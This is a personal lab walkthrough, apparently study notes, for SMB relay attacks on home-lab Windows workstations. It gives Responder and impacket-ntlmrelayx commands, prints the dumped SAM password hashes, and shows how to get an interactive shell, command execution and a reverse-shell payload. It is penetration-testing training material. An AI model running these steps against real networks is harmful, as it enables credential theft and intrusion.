---
created_date: 02 October 2023
updated_date: 02 October 2023
type: SMB Relay Testing - Windows
url: https://www.youtube.com/watch?v=mcaWOkmJVHk
---
##### Machine Information
```
Gobots (Attacker)
===============

192.168.146.134/135 (ALLIANCE/HORDE Workstations)
===============
```
###### High-Level Summary

A brief description of the attack chain with machine names, including the depth of compromise should be included here.

- SMB relays happen when local administrators are misconfigured by being local admin's on multiple different workstations.

-------
##### Lessons Learned
-  Cannot SMB relay against DC, has to be local machines due to dumping SAM file.
-  Doesn't work all the time, takes multiple attempts for a successful ntlm hash dump.
-  Recommend using `impacket-ntlmrelayx` instead of `ntlmrelayx.py` due to the impacket one being alot more consistent

-------------
##### Initial Scanning

- Default scanning conducted in [[1 link-local_multicast_name_Resolution (LLMNR)]]
-------------
###### SMB Relay Check
- If  `Message signing enabled and required` comes back this device IS NOT vulnerable to smb_relay attacks
- If it shows `Message signing enabled but not required` then it is vulnerable to smb relays
```bash
[root💀/dev/shm] [192.168.146.129] [2023-10-02 12:42:33] 
 └─╼ # nmap --script=smb2-security-mode.nse 192.168.146.*
Nmap scan report for 192.168.146.134
Host is up (0.0020s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:7D:84:45 (VMware)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap scan report for 192.168.146.129
Host is up (0.000010s latency).
Not shown: 985 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
110/tcp  open  pop3
135/tcp  open  msrpc
143/tcp  open  imap
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
587/tcp  open  submission
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server
6666/tcp open  irc

Host script results:
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required

Nmap done: 256 IP addresses (6 hosts up) scanned in 11.32 seconds


```
-------
##### Responder.conf setup
#responder 
- Used `vim /usr/share/responder/Responder.conf` to change SMB & HTTP to OFF because we are going to use `ntlmrelayx.py` to dump the SAM file.
![[Pasted image 20231002120403.png]]
##### Responder.py
#sha256sum 
```bash
[root💀/usr/share/responder] [192.168.146.129] [2023-10-02 12:01:33] 
 └─╼ # sha256sum Responder.py 
cfb555bb68a8967b158ff8c810456c8249db3ef4edba51c0290787b3114101d8  Responder.py
```
###### Responder.py Setup
#responder
Setting up responder.py to listen on network interface eth0, same as it was during LLMNR poisoning
```bash
[root💀/usr/share/responder] [192.168.146.129] [2023-10-02 09:40:33] 
 └─╼ # python3 Responder.py -I eth0 -dwv

-I eth0 = to specify network interface to listen on
-d = Enable answers for NETBIOS DHCP broadcast requests.
-w = Start the WPAD rogue proxy server.
-v = Increase verbosity
```
![[Pasted image 20231002142557.png]]

---------------------
###### NTLMrelayx
#ntlmrelayx
- The first one is a hit or miss, recommend using `impacket-ntlmrelayx` instead as it is way more consistent
```bash
[root💀/usr/share/doc/python3-impacket/examples] [192.168.146.129] [2023-10-02 14:48:23] 
 └─╼ # sha256sum ntlmrelayx.py 
6b1c181ad220238e50464e45b09ddd0aa17c694793d24a83165a2111ebe11eb3  ntlmrelayx.py

[root💀/usr/share/doc/python3-impacket/examples] [192.168.146.129] [2023-10-02 14:51:18] 
 └─╼ # sha256sum /usr/bin/impacket-ntlmrelayx
5385227093ca3c01e47713aed4b570689688ca65e76ec676709f155bdea5ce89  /usr/bin/impacket-ntlmrelayx
```
- Create target.txt file to have the ALLIANCE/HORDE IP's or Workstation IP addresses, can list an entire /24 if wanted
![[Pasted image 20231002143109.png]]
- Started `ntlmrelayx.py`
- This one is a hit or miss if it works or not
```powershell
[root💀/usr/share/doc/python3-impacket/examples] [192.168.146.129] [2023-10-02 12:57:09] 
 └─╼ # python3 ntlmrelayx.py -tf /dev/shm/target.txt -smb2support
```
Recommend using this one for more consistent results
```bash
[root💀/usr/bin] [192.168.146.129] [2023-10-02 14:42:05] 
 └─╼ # ./impacket-ntlmrelayx -tf /dev/shm/target.txt -smb2support
```
Trigger an event on Horde 192.168.146.134 by using a fake share such as `\\cry`
![[Pasted image 20231002151317.png]]
SAM Hash Dump's
#hashes #sam
```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2d31cefa5ac81003579efa63c4bcf01b:::
Sylvanas Windrunner:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```
![[Pasted image 20231002142827.png]]
```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:0461d08fe373ba1122d8c25cf734205c:::
Anduin Wrynn:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::

```
![[Pasted image 20231002151610.png]]

------------
##### Gaining an Interactive shell
- Utilize the same Responder.py 
```bash
[root💀/usr/share/responder] [192.168.146.129] [2023-10-02 09:40:33] 
 └─╼ # python3 Responder.py -I eth0 -dwv
```
- add a `-i` for interactive to be able to look through share drive
```bash
[root💀/usr/bin] [192.168.146.129] [2023-10-02 15:25:18] 
 └─╼ # ./impacket-ntlmrelayx -tf /dev/shm/target.txt -smb2support -i
```
- Will display the port to hit to get into interactive shell
![[Pasted image 20231002153411.png]]
- Connect via `nc`
- note that the IP shows kali machine IP
```bash
[root💀/usr/share/doc/python3-impacket/examples] [192.168.146.129] [2023-10-02 14:51:22] 
 └─╼ # nc 127.0.0.1 11000
# who
host: \\192.168.146.129, user: Administrator, active:   422, idle:     0
# shares
ADMIN$
C$
IPC$
# use C$
# ls
drw-rw-rw-          0  Mon Oct  2 10:23:38 2023 $Recycle.Bin
```
- Add a `-c` to run commands instead for commands
```bash
[root💀/usr/bin] [192.168.146.129] [2023-10-02 15:25:18] 
 └─╼ # ./impacket-ntlmrelayx -tf /dev/shm/target.txt -smb2support -c "whoami"
```
- Add a `-e` to utilize a reverse shell
```bash
[root💀/usr/bin] [192.168.146.129] [2023-10-02 15:25:18] 
 └─╼ # ./impacket-ntlmrelayx -tf /dev/shm/target.txt -smb2support -e shell.exe
```

There is a method to get a reverse shell through powershell empire as well, haven't looked to much into it but heres a video from tcm
`https://www.youtube.com/watch?v=mcaWOkmJVHk`